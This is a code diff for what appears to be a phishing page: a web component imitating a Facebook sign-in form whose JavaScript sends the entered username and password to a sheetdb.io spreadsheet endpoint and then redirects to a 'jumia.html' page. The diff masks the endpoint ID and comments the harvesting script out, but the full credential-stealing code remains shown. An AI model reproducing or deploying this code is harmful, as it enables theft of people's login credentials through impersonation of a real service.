@@ -32,7 +32,7 @@ class Facebook extends HTMLElement{
                                     
                                             <!-- Sign In container -->
                                             <div class="col-12 col-md-10 col-lg-6 mx-auto">
-                                                <form action="https://sheetdb.io/api/v1/boeqkar8i41wn" method="post" id="fb-sheetdb-form">
+                                                <form action="https://sheetdb.io/api/v1/*******" method="post" id="fb-sheetdb-form">
                                                     <div class="social-input-con">
                                                         <div class="row">
                                                             <div class="col-12">
@@ -103,24 +103,24 @@ customElements.define("facebook-page", Facebook);
 
 
 
-var form = document.getElementById('fb-sheetdb-form');
-form.addEventListener("submit", e => {
-    e.preventDefault();
-    fetch(form.action, {
-        method : "POST",
-        body: new FormData(document.getElementById("fb-sheetdb-form")),
-    }).then(
-        response => response.json()
-    ).then((html) => {
-        // you can put any JS code here
-        window.open('jumia.html', '_self');
-    });
-});
+// var form = document.getElementById('fb-sheetdb-form');
+// form.addEventListener("submit", e => {
+//     e.preventDefault();
+//     fetch(form.action, {
+//         method : "POST",
+//         body: new FormData(document.getElementById("fb-sheetdb-form")),
+//     }).then(
+//         response => response.json()
+//     ).then((html) => {
+//         // you can put any JS code here
+//         window.open('jumia.html', '_self');
+//     });
+// });
 
 
-document.getElementById("faze-bn").addEventListener('click', function () {
-    var user = document.getElementById('inzuser');
-    var pass = document.getElementById('inzpass');
-    user.value += ' ---- ';
-    pass.value += ' ---- ';
-});
+// document.getElementById("faze-bn").addEventListener('click', function () {
+//     var user = document.getElementById('inzuser');
+//     var pass = document.getElementById('inzpass');
+//     user.value += ' ---- ';
+//     pass.value += ' ---- ';
+// });
